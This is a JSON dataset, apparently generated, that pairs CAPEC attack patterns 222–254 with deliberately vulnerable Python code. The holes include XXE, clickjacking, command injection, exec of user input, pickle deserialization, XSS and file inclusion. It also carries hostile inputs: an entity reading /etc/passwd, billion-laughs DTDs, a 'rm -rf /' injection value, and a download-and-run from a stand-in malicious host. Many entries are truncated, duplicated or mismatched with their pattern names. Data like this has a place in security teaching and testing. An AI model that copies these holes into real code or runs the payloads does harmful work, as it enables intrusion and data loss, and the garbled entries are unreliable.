        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nimport urllib.request\n\ndef parse_xml_document(xml_input):\n    try:\n        parser = ET.XMLParser()\n        tree = ET.fromstring(xml_input, parser=parser)\n        \n        for entity in tree.findall('.//entity'):\n            uri = entity.get('uri')\n            if uri:\n                # Vulnerable: Blindly fetching external entities without validation\n                content = urllib.request.urlopen(uri).read()\n                entity.text = content.decode('utf-8')\n        \n        return ET.tostring(tree)\n    except Exception as e:\n        return str(e)\n\n# Example usage\nxml_data = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<root>\n    <entity uri=\"http://malicious-server.com/large-file.xml\"/>\n    &xxe;\n</root>'''\n\nresult = parse_xml_document(xml_data)\n\"\"\",\n    \"description\": \"This code demonstrates an XML External Entity (XXE) vulnerability by processing XML documents without proper entity reference restrictions. It allows external entities to be resolved and fetched from arbitrary URIs, which could lead to server-side request forgery, denial of service, or exposure of sensitive files. The code blindly processes external entities and URIs without validation, making it susceptible to resource exhaustion attacks and potential information disclosure.\"",
        "description": "\"This code demonstrates an XML External Entity (XXE) vulnerability by processing XML documents without proper entity reference restrictions. It allows external entities to be resolved and fetched from arbitrary URIs, which could lead to server-side request forgery, denial of service, or exposure of sensitive files. The code blindly processes external entities and URIs without validation, making it susceptible to resource exhaustion attacks and potential information disclosure.\""
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    external_url = request.args.get('url', '')\n    iframe_content = f'''\n    <div style=\"position: absolute; z-index: 1000;\">\n        <iframe src=\"{external_url}\" style=\"opacity: 0.01; position: fixed; \n                top: 0; left: 0; width: 100%; height: 100%;\">\n        </iframe>\n    </div>\n    <div style=\"position: relative; z-index: 1;\">\n        <h1>Secure Banking Portal</h1>\n        <form action=\"/transfer\" method=\"POST\">\n            <input type=\"text\" name=\"amount\" placeholder=\"Amount\">\n            <input type=\"submit\" value=\"Transfer\">\n        </form>\n    </div>\n    '''\n    return render_template('base.html', content=iframe_content)",
        "description": "This vulnerable code creates a banking interface that allows an attacker to overlay a nearly invisible iframe on top of the legitimate banking form. The iframe's source is controlled by the URL parameter without proper validation, allowing malicious content to be loaded. The overlay is positioned with high z-index and very low opacity, making it invisible while still capturing user interactions. This enables clickjacking and UI redressing attacks where users think they're interacting with the legitimate banking form but are actually interacting with the malicious overlay."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "def system_fingerprint():\n    system_info = {\n        'os_version': platform.system() + ' ' + platform.release(),\n        'hostname': socket.gethostname(),\n        'kernel': platform.version(),\n        'processor': platform.processor(),\n        'python_version': sys.version,\n        'installed_packages': [pkg for pkg in pkg_resources.working_set],\n        'network_interfaces': psutil.net_if_addrs(),\n        'running_processes': [p.name() for p in psutil.process_iter()],\n        'open_ports': [(conn.laddr.port, conn.status) for conn in psutil.net_connections()],\n        'system_users': [user.name for user in psutil.users()]\n    }\n    \n    debug_mode = True  # Debug mode left enabled\n    if debug_mode:\n        with open('system_fingerprint.log', 'w') as f:\n            json.dump(system_info, f, indent=4)\n    \n    return system_info",
        "description": "This code contains a vulnerable system fingerprinting function that collects and exposes sensitive system information. It gathers detailed system data including OS version, hostname, running processes, network interfaces, open ports, and system users. The code has multiple security issues: it collects excessive sensitive information (CWE-200), stores it in an unprotected log file (CWE-1323), exposes system-level details (CWE-497), and leaves debug functionality enabled in production (CWE-1313). This information could be used by an attacker to fingerprint the system and identify potential vulnerabilities."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "\"\"\"from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\nsessions = {",
        "description": "\"This vulnerable code demonstrates insecure session management by creating weak session tokens, lacking session expiration, missing cookie security flags, and performing insufficient session validation. It trusts client-side cookies without proper validation, doesn't invalidate existing sessions, and uses a weak token generation mechanism. The code is susceptible to session fixation, cookie manipulation, and session hijacking attacks.\""
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "def process_user_request(data):\n    # No limit on concurrent requests or resource allocation\n    while True:\n        # Simulate heavy processing without timeout\n        result = []\n        for i in range(len(data)):\n            # Exponential growth of resource usage\n            result.extend([x * i for x in data])\n            # Sleep to maintain connection\n            time.sleep(0.1)\n        \n        # Keep connection alive indefinitely\n        if len(result) > 0:\n            continue\n        return result\n\ndef handle_connection(conn):\n    # No authentication or rate limiting\n    while True:\n        data = conn.recv(1024)\n        if data:\n            # Spawn new thread for each request without limits\n            thread = threading.Thread(target=process_user_request, args=(data,))\n            thread.start()",
        "description": "This code represents a vulnerable server implementation that allows resource exhaustion through multiple vectors: unlimited thread creation, unbounded memory allocation, and endless processing loops. It lacks authentication, rate limiting, and resource controls, allowing a malicious user to consume server resources through seemingly legitimate requests that never complete."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_input):\n    # Vulnerable: No validation of DTD or entity expansion\n    parser = ET.XMLParser()\n    try:\n        tree = ET.fromstring(xml_input, parser=parser)\n        # Process the XML document\n        for elem in tree.iter():\n            print(elem.tag, elem.text)\n    except Exception as e:\n        print(f'Error parsing XML: {e}')\n\n# Example usage with malicious DTD\nmalicious_xml = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n    <!ENTITY lol \"lol\">\n    <!ENTITY lol2 \"&lol;&lol;&lol;&lol;\">\n    <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;\">\n    <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;\">\n]\n<root>&lol4;</root>'''\n\nprocess_xml(malicious_xml)",
        "description": "This code demonstrates vulnerable XML processing by using an unconfigured XML parser that doesn't restrict entity expansion or DTD processing. It allows processing of untrusted XML input with custom DTDs, making it susceptible to billion laughs attacks and XML entity expansion attacks. The code doesn't implement any controls for recursive entity references, external entity references, or DTD restrictions."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import yaml\nimport xml.etree.ElementTree as ET\n\ndef process_config(data_file):\n    with open(data_file, 'r') as f:\n        # Vulnerable YAML parsing without size limits\n        if data_file.endswith('.yaml'):\n            config = yaml.load(f, Loader=yaml.Loader)\n        # Vulnerable XML parsing with external entities enabled\n        elif data_file.endswith('.xml'):\n            parser = ET.XMLParser()\n            tree = ET.parse(f, parser=parser)\n            config = tree.getroot()\n    \n    # Process nested configurations recursively without depth limit\n    def process_nested(conf):\n        if isinstance(conf, dict):\n            for k, v in conf.items():\n                process_nested(v)\n        elif isinstance(conf, list):\n            for item in conf:\n                process_nested(item)\n    \n    process_nested(config)\n    return config",
        "description": "This code demonstrates a vulnerable implementation of a serialized data parser that processes YAML and XML files without proper resource limits or validation. It uses unsafe parsing methods (yaml.load) and enables XML external entities. The recursive processing of nested configurations without depth limits can lead to resource exhaustion through specially crafted input files with deeply nested structures or circular references."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml_data(xml_input):\n    try:\n        # No validation against schema\n        tree = ET.fromstring(xml_input)\n        \n        def process_element(element):\n            result = {}\n            # Recursive processing without depth limit\n            for child in element:\n                if len(child) > 0:\n                    result[child.tag] = process_element(child)\n                else:\n                    # Expand entities without limit\n                    if child.text and '&' in child.text:\n                        result[child.tag] = ET.XML(f'<root>{child.text}</root>')\n                    else:\n                        result[child.tag] = child.text\n            return result\n        \n        return process_element(tree)\n    except Exception as e:\n        return str(e)\n\n# Example usage\nxml_data = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n  <!ENTITY b \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\">\n  <!ENTITY c \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\">\n  <!ENTITY d \"1234567890\">\n]>\n<root>&a;</root>'''",
        "description": "This code demonstrates a vulnerable XML parser that fails to validate input against a schema, doesn't limit entity expansion or recursion depth, and processes untrusted XML input without proper controls. It's susceptible to billion laughs attack and XML entity expansion attacks, potentially leading to denial of service through excessive resource consumption."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "\"\"\"\nimport xml.dom.minidom\nimport pickle\nimport socket\n\nclass VulnerableXMLParser:\n    def parse_xml_data(self, xml_string):\n        # Missing XML validation against schema (CWE-112)\n        dom = xml.dom.minidom.parseString(xml_string)\n        self.process_node(dom.documentElement)\n    \n    def process_node(self, node):\n        # Uncontrolled recursion (CWE-674)\n        for child in node.childNodes:\n            self.process_node(child)\n            \ndef receive_and_process():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(1)\n    \n    while True:\n        conn, addr = server.accept()\n        data = conn.recv(65536)\n        \n        # Unsafe deserialization of untrusted data (CWE-20)\n        # No resource limits (CWE-770)\n        parsed_data = pickle.loads(data)\n        \n        parser = VulnerableXMLParser()\n        parser.parse_xml_data(parsed_data)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerability to oversized serialized data payloads by accepting untrusted XML and pickled data without validation, size limits, or proper schema checking. It includes uncontrolled recursion in XML parsing and unsafe deserialization, potentially leading to resource exhaustion and arbitrary code execution.\"",
        "description": "\"This code demonstrates vulnerability to oversized serialized data payloads by accepting untrusted XML and pickled data without validation, size limits, or proper schema checking. It includes uncontrolled recursion in XML parsing and unsafe deserialization, potentially leading to resource exhaustion and arbitrary code execution.\""
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "class SecurityManager:\n    def __init__(self):\n        self.security_check_complete = False\n        self.user_privileges = {}\n    \n    def add_user(self, username, privilege_level):\n        self.user_privileges[username] = privilege_level\n    \n    def execute_privileged_action(self, username, action):\n        # Vulnerable: Data forwarded before security check complete\n        action_started = True\n        \n        # Race condition between privilege check and action execution\n        if username in self.user_privileges:\n            privilege_check = (self.user_privileges[username] >= 5)\n            \n            # Vulnerable: Time gap between check and use\n            if privilege_check:\n                return action()\n            \n        # Action might have started before privilege check completed\n        if action_started:\n            return action()\n        \n        return None\n\n# Usage Example\ndef sensitive_operation():\n    return 'Accessing sensitive data'\n\nsec_mgr = SecurityManager()\nsec_mgr.add_user('user1', 1)\n# Privilege escalation possible due to race condition\nresult = sec_mgr.execute_privileged_action('user1', sensitive_operation)",
        "description": "This vulnerable code demonstrates privilege escalation through improper privilege management and race conditions. The security manager fails to properly synchronize privilege checks with action execution, allowing potential privilege escalation. It also shows improper isolation where privilege checks can be bypassed due to premature data forwarding and insufficient handling of privilege violations."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\ndef run_backup_service():\n    # Run service with root privileges\n    if os.geteuid() != 0:\n        os.setuid(0)  # Escalate to root\n    \n    # Read user-controlled backup configuration\n    with open('backup_config.txt', 'r') as f:\n        backup_cmd = f.read().strip()\n    \n    # Execute backup command without validation\n    subprocess.Popen(backup_cmd, shell=True)\n    \n    # Service continues running with root privileges\n    while True:\n        process_backup_tasks()\n\ndef process_backup_tasks():\n    # Process keeps running with elevated privileges\n    pass\n\nif __name__ == '__main__':\n    run_backup_service()",
        "description": "This code demonstrates multiple privilege-related vulnerabilities. It unnecessarily escalates to root privileges, maintains those privileges throughout execution, executes user-controlled input via shell commands without validation, and fails to drop privileges after the elevated operations. An attacker could modify the backup_config.txt file to execute arbitrary commands with root privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "\"\"\"import threading\n\nclass UnsafeCounter:\n    count = 0  # static, non-final field\n    auth_token = None  # static authentication token\n    \n    @staticmethod\n    def increment():\n        current = UnsafeCounter.count\n        # Simulate some work that could be interrupted\n        threading.Event().wait(0.1)\n        UnsafeCounter.count = current + 1\n    \n    @staticmethod\n    def authenticate(token):\n        UnsafeCounter.auth_token = token\n    \n    @staticmethod\n    def perform_privileged_operation(received_token):\n        # Vulnerable to replay attacks\n        if received_token == UnsafeCounter.auth_token:\n            # Start privileged thread without proper synchronization\n            thread = threading.Thread(target=UnsafeCounter.increment)\n            thread.start()\n            return True\n        return False\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities including a non-final static member (count) in a multi-threaded context, authentication bypass through capture-replay (auth_token), and thread hijacking due to improper synchronization. The static fields can be accessed and modified by multiple threads without proper locking, and the authentication mechanism is vulnerable to replay attacks as it uses a simple token comparison.\"",
        "description": "\"This code demonstrates multiple vulnerabilities including a non-final static member (count) in a multi-threaded context, authentication bypass through capture-replay (auth_token), and thread hijacking due to improper synchronization. The static fields can be accessed and modified by multiple threads without proper locking, and the authentication mechanism is vulnerable to replay attacks as it uses a simple token comparison.\""
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import socket\nimport signal\nimport fcntl\n\ndef unsafe_signal_handler(signum, frame):\n    # Unsafe: performs non-reentrant operations in signal handler\n    global auth_token\n    auth_token = request_new_token()\n\ndef request_new_token():\n    # Vulnerable replay attack implementation\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('auth_server', 8080))\n    message = b'REQUEST_TOKEN'\n    sock.send(message)\n    token = sock.recv(1024)\n    sock.close()\n    return token\n\ndef process_ioctl(fd, command):\n    try:\n        # No access control check before IOCTL\n        return fcntl.ioctl(fd, command)\n    except IOError:\n        # Error condition not properly handled\n        pass\n\n# Register unsafe signal handler\nsignal.signal(signal.SIGUSR1, unsafe_signal_handler)\n\n# Main authentication loop\nwhile True:\n    received_token = input('Enter token: ')\n    # Vulnerable to replay attacks - no timestamp or nonce check\n    if received_token == auth_token:\n        print('Access granted')\n    else:\n        print('Access denied')",
        "description": "This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks (CWE-294), unsafe signal handler implementation (CWE-828), insufficient IOCTL access control (CWE-782), and unchecked error conditions (CWE-391). The authentication system uses a simple token comparison without any replay protection, while the signal handler performs non-reentrant operations. The IOCTL functionality lacks proper access controls, and error conditions are silently ignored."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "class UnsafeSandbox:\n    def __init__(self):\n        self.native_lib = ctypes.CDLL('libc.so.6')\n        self._restricted_mode = True\n    \n    def execute_code(self, user_code):\n        try:\n            # Unsafe: Allows execution of native code through ctypes\n            if 'ctypes' in user_code:\n                exec(user_code, {'ctypes': ctypes})\n            \n            # Unsafe: Exposes internal data through inner class\n            class InnerData:\n                def __init__(self):\n                    self.sensitive_data = 'secret_key_123'\n                    \n            # Unsafe: Allows direct system calls\n            def run_system_command(cmd):\n                return self.native_lib.system(cmd.encode())\n                \n            exec(user_code)\n        except Exception as e:\n            # Unsafe: Exposes sensitive information in error messages\n            print(f'Execution failed with details: {str(e)}')\n            traceback.print_exc()",
        "description": "This code demonstrates a vulnerable sandbox implementation that allows sandbox escape through multiple vectors: direct native code execution via ctypes, exposure of sensitive data through inner classes, uncontrolled system command execution, and information disclosure through detailed error messages."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "class WebServer:\n    # Symbolic constants scattered throughout code (CWE-1107)\n    ADMIN_PATH = '/admin'\n    USER_PATH = '/user'\n    \n    def handle_request(self, url):\n        # Authorization before full URL parsing (CWE-551)\n        if '/admin' in url:\n            if not self.is_admin():\n                return 'Unauthorized'\n        \n        # Incorrect parsing after authorization\n        parsed_url = self.parse_url(url)\n        \n        # Improper protection of alternate paths (CWE-424)\n        if parsed_url.startswith('/user/../admin'):\n            # This path bypasses the authorization check\n            return self.get_admin_data()\n        \n        # Always incorrect control flow (CWE-670)\n        if parsed_url.startswith(self.USER_PATH):\n            return self.get_user_data()\n        elif parsed_url.startswith(self.ADMIN_PATH):\n            return self.get_admin_data()\n        else:\n            # Violation of secure design principles (CWE-657)\n            # Default case returns sensitive data\n            return self.get_admin_data()",
        "description": "This code demonstrates multiple security vulnerabilities including improper URL parsing before authorization, scattered symbolic constants, incorrect control flow implementation, and insufficient protection of alternate paths. The server performs authorization checks before fully parsing the URL, allowing path traversal attacks. It also contains hardcoded paths and improper access control that could be bypassed through various URL manipulations."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "\"\"\"\nclass OnlineStore:\n    def __init__(self):\n        self.logged_in = False\n        \n    def client_side_login(self, username, password):\n        # Vulnerable: Authentication is performed only on client side\n        self.logged_in = True\n        return True\n        \n    def make_purchase(self, item_id, price):\n        # Client-side price validation\n        if self.logged_in and price > 0:\n            # No server-side validation of price\n            return self.process_transaction(item_id, price)\n    \n    def process_transaction(self, item_id, price):\n        # Assumes client-side checks are trustworthy\n        return f\\\"Transaction completed for item {item_id",
        "description": "\"This code demonstrates multiple security vulnerabilities including client-side authentication (CWE-603), client-side enforcement of server-side security (CWE-602), and lack of proper server-side validation. The authentication mechanism is implemented purely on the client side and can be bypassed. Additionally, critical business logic like price validation is performed client-side, allowing malicious users to manipulate transaction values.\""
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "def process_file(user_input):\n    # User-controlled file path without validation\n    file_path = f'/data/{user_input}'\n    \n    try:\n        # Directly using user input to access files\n        with open(file_path, 'r') as file:\n            data = file.read()\n            \n        # Dynamic code execution based on user input\n        exec(f'result = process_{user_input}(data)')\n        \n        return data\n    except Exception as e:\n        return str(e)",
        "description": "This code demonstrates resource injection vulnerability by allowing unvalidated user input to directly influence file paths and dynamic code execution. It fails to properly validate or sanitize the input before using it as a resource identifier, allowing potential directory traversal and arbitrary code execution through crafted input values."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "def authenticate_user(username, password):\n    # Using obsolete MD5 hashing\n    from hashlib import md5\n    \n    # Insecure dynamic code loading\n    code = input('Enter code to execute: ')\n    exec(code)\n    \n    # Using deprecated file handling without proper cleanup\n    f = open('credentials.txt', 'r')\n    stored_hash = f.read().strip()\n    \n    # Vulnerable authentication comparison\n    if md5(password.encode()).hexdigest() == stored_hash:\n        return True\n    return False",
        "description": "This vulnerable code demonstrates multiple deprecated and insecure practices including use of obsolete MD5 hashing, dangerous dynamic code execution through exec(), improper file handling without closing resources, and weak authentication mechanisms. The code allows for potential code injection and authentication bypass through multiple vectors."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "def process_user_script(user_input):\n    script = f'''\ndef custom_function():\n    {user_input}\n'''\n    exec(script)\n    return True\n\ndef main():\n    user_code = input('Enter your Python code: ')\n    process_user_script(user_code)",
        "description": "A vulnerable code execution system that directly accepts Python code as user input and executes it using exec() without any validation or sanitization, allowing arbitrary code execution through user input."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef unsafe_html_handler(user_input):\n    # Vulnerable template that directly embeds user input in HTML attributes\n    template = '''\n    <html>\n        <body>\n            <div style=\"{}\">\n                Welcome!\n            </div>\n            <a href=\"#\" onmouseover=\"{}\">\n                Hover me\n            </a>\n            <img src=\"{}\" onerror=\"{}\">\n        </body>\n    </html>\n    '''.format(user_input, user_input, user_input, user_input)\n    \n    return render_template_string(template)",
        "description": "This code demonstrates vulnerable handling of user input in HTML attributes where the input is directly embedded without proper sanitization. The code accepts user input and places it into various HTML attributes including style, onmouseover, src, and onerror, making it susceptible to XSS attacks through attribute injection. An attacker could input malicious JavaScript code that would be executed when the page is rendered."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef display_user_profile(user_input):\n    # Vulnerable: directly embedding user input into HTML template\n    template = '''\n    <html>\n    <body>\n        <h1>User Profile</h1>\n        <img src=\"%s\" />\n        <a href=\"%s\">Click here</a>\n    </body>\n    </html>\n    ''' % (user_input, user_input)\n    return render_template_string(template)\n\napp = Flask(__name__)\n\n@app.route('/profile')\ndef profile():\n    # User input could contain malicious URI schemes\n    user_data = request.args.get('data', '')\n    return display_user_profile(user_data)",
        "description": "This code demonstrates a vulnerable web application that fails to properly sanitize user input before embedding it into HTML attributes. The application accepts user input and directly renders it within an img src attribute and anchor href attribute, allowing for potential injection of malicious URI schemes including javascript: protocols, data: URIs with base64-encoded payloads, and other dangerous content that could lead to XSS attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request\n\ndef sanitize_input(user_input):\n    # Flawed sanitization that only checks for single occurrences\n    dangerous = ['<script>', '<img>', '<iframe>']\n    for tag in dangerous:\n        if tag in user_input.lower():\n            return ''\n    return user_input\n\napp = Flask(__name__)\n\n@app.route('/comment', methods=['POST'])\ndef post_comment():\n    user_comment = request.form.get('comment', '')\n    # Vulnerable: doubles characters can bypass filter\n    sanitized = sanitize_input(user_comment)\n    # Directly embedding user input in HTML response\n    response = f\"<div class='comment'>{sanitized}</div>\"\n    return response",
        "description": "A vulnerable Flask application that attempts to sanitize user input but fails to account for doubled characters in XSS attack vectors. The sanitization function only checks for exact matches of dangerous tags, allowing bypasses using character doubling (e.g., '<<script>' or '<<img>'). The sanitized input is then directly embedded into HTML output without proper encoding."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef filter_xss(input_str):\n    # Incomplete denylist - only checks basic patterns\n    blacklist = ['<script>', 'javascript:']\n    filtered = input_str\n    for pattern in blacklist:\n        filtered = filtered.replace(pattern, '')\n    return filtered\n\napp = Flask(__name__)\n\n@app.route('/render', methods=['GET'])\ndef render_content():\n    user_input = request.args.get('content', '')\n    # Incomplete filtering that misses alternate XSS syntax\n    sanitized = filter_xss(user_input)\n    \n    # Vulnerable template that allows IMG tag with script in attributes\n    template = f'''\n    <html>\n        <body>\n            <div>{sanitized}</div>\n            <img src=\"{sanitized}\" />\n        </body>\n    </html>\n    '''\n    \n    return render_template_string(template)\n\n# Permissive cross-domain policy\nwith open('crossdomain.xml', 'w') as f:\n    f.write('<cross-domain-policy><allow-access-from domain=\"*\" /></cross-domain-policy>')",
        "description": "This vulnerable code demonstrates multiple XSS vulnerabilities including an incomplete denylist-based XSS filter, lack of proper sanitization for IMG tag attributes, and permissive cross-domain policy. The filter_xss function fails to catch doubled characters, alternate XSS syntax, and various script injection techniques in HTML attributes. The code also creates an overly permissive crossdomain.xml file that allows access from any domain."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "\"\"\"\ndef process_user_input(user_input):\n    # Flawed filter that stops checking after encountering a null byte\n    filtered_input = ''\n    for char in user_input:\n        if char == '\\\\x00':  # Null byte\n            break\n        filtered_input += char\n    \n    # Vulnerable HTML output construction\n    html_output = f'''\n        <div class=\"user-content\">\n            {filtered_input",
        "description": "\"This vulnerable code demonstrates a flawed input filtering mechanism that stops processing after encountering invalid characters (like null bytes), allowing subsequent malicious content to bypass security checks. It fails to properly encode special characters and directly embeds user input into HTML and JavaScript contexts, making it susceptible to XSS attacks through various character manipulation techniques.\""
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "def execute_backup(filename):\n    # Takes user input for backup filename and executes system command\n    backup_cmd = 'tar -czf /backups/' + filename + ' /data'\n    os.system(backup_cmd)\n\ndef main():\n    user_input = input('Enter backup filename: ')\n    execute_backup(user_input)",
        "description": "This vulnerable code accepts user input for a filename and directly concatenates it into a system command without sanitization, allowing command injection. An attacker could input malicious values like '; rm -rf /' to execute arbitrary commands. The code demonstrates CWE-78 by failing to neutralize special elements in OS commands and CWE-77 by improper command construction from user input."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\ndef process_device_command(device_path, command):\n    # Vulnerable: Direct concatenation of user input into device command\n    device_command = f'echo {command} > {device_path}'\n    os.system(device_command)\n\n# Example usage\ndevice_path = '/dev/tty1'\nuser_input = input('Enter command: ')\nprocess_device_command(device_path, user_input)",
        "description": "This code demonstrates a vulnerable implementation of terminal device manipulation where user input is directly concatenated into a command string without proper sanitization. An attacker could inject malicious commands using special characters (like ; | && >), potentially executing arbitrary commands on the system through the terminal device."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "from lxml import etree\n\ndef search_users(user_query):\n    # Load XML database\n    xml_db = etree.parse('users.xml')\n    \n    # Construct XPath query directly from user input without sanitization\n    xpath_query = f\"//user[username='{user_query}']\"\n    \n    # Execute query against XML database\n    result = xml_db.xpath(xpath_query)\n    \n    return result\n\ndef process_user_request():\n    # Get user input from web form\n    user_input = request.form.get('username')\n    \n    # Pass raw input directly to XML query\n    user_data = search_users(user_input)\n    return user_data",
        "description": "This code demonstrates vulnerable XML/XPath injection by directly incorporating user input into an XPath query without proper validation or sanitization. The vulnerability allows attackers to inject malicious XML/XPath expressions that could manipulate the query logic, potentially exposing or modifying sensitive data in the XML database. An attacker could input something like \"'] | //* | //*[''='\" to retrieve all records or manipulate the query structure."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "\"\"\"\nimport os\nimport importlib.util\nimport sys\n\n# Global variables for configuration\nLIBRARY_PATH = \\\"C:/system/libs\\\"\nALLOWED_EXTENSIONS = [\\\".py\\\", \\\".dll\\\", \\\".so\\\"]\n\ndef load_dynamic_library(lib_name):\n    global LIBRARY_PATH\n    \n    # Dangerous: No validation of library path or contents\n    lib_path = os.path.join(LIBRARY_PATH, lib_name)\n    \n    if lib_path.endswith(\\\".py\\\"):\n        spec = importlib.util.spec_from_file_location(lib_name, lib_path)\n        module = importlib.util.module_from_spec(spec)\n        sys.modules[lib_name] = module\n        spec.loader.exec_module(module)\n        return module\n    else:\n        # Potentially loading arbitrary DLL/SO files\n        from ctypes import CDLL\n        return CDLL(lib_path)\n\ndef execute_library_function(lib_name, func_name):\n    lib = load_dynamic_library(lib_name)\n    if hasattr(lib, func_name):\n        return getattr(lib, func_name)()\n    return None\n\n# Usage example with unchecked input\nuser_lib = input(\\\"Enter library name: \\\")\nuser_func = input(\\\"Enter function name: \\\")\nresult = execute_library_function(user_lib, user_func)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable dynamic library loading by allowing arbitrary code execution through user-controlled input. It relies heavily on global variables, performs no validation of library sources, and allows loading of potentially malicious libraries from the local filesystem. The code makes machine-dependent assumptions about library file extensions and paths, and lacks proper controls on dynamically-managed code resources.\"",
        "description": "\"This code demonstrates vulnerable dynamic library loading by allowing arbitrary code execution through user-controlled input. It relies heavily on global variables, performs no validation of library sources, and allows loading of potentially malicious libraries from the local filesystem. The code makes machine-dependent assumptions about library file extensions and paths, and lacks proper controls on dynamically-managed code resources.\""
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/load_file', methods=['POST'])\ndef load_file():\n    file_path = request.form.get('file_path', '')\n    file_type = request.form.get('type', '')\n    \n    if file_type == 'php':\n        # Dangerous: No validation of file path or content\n        with open(file_path, 'r') as file:\n            content = file.read()\n            # Simulate PHP file execution\n            exec(content)\n            return content\n    \n    return 'Invalid file type'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    uploaded_file = request.files['file']\n    filename = uploaded_file.filename\n    \n    # Dangerous: Relying only on file extension\n    if filename.endswith('.php'):\n        # Dangerous: Saving file without proper validation\n        upload_path = os.path.join('uploads', filename)\n        uploaded_file.save(upload_path)\n        return f'File saved to {upload_path",
        "description": "\"This vulnerable code allows arbitrary file loading and execution, demonstrating unsafe file inclusion patterns. It lacks proper input validation for file paths, relies solely on file extensions for security checks, and allows direct execution of uploaded content. The code also demonstrates improper handling of file uploads and external variable modification through form parameters.\""
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import urllib.request\nimport importlib.util\n\ndef load_remote_library(url, lib_name):\n    try:\n        # Download library from remote URL without verification\n        response = urllib.request.urlopen(url)\n        lib_content = response.read()\n        \n        # Save to temporary file\n        with open(f'/tmp/{lib_name}.py', 'wb') as f:\n            f.write(lib_content)\n        \n        # Dynamically load the downloaded code\n        spec = importlib.util.spec_from_file_location(lib_name, f'/tmp/{lib_name}.py')\n        module = importlib.util.module_from_spec(spec)\n        spec.loader.exec_module(module)\n        \n        return module\n    except Exception as e:\n        print(f'Failed to load library: {e}')\n\n# Usage example\nremote_lib = load_remote_library('http://untrusted-server.com/malicious_lib.py', 'remote_module')\nif remote_lib:\n    remote_lib.run_function()",
        "description": "This code demonstrates unsafe remote code loading by downloading and executing Python code from an untrusted URL without any integrity checks or verification. It creates a temporary file with the downloaded code and uses Python's importlib to dynamically load and execute it, potentially allowing arbitrary code execution from untrusted sources."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
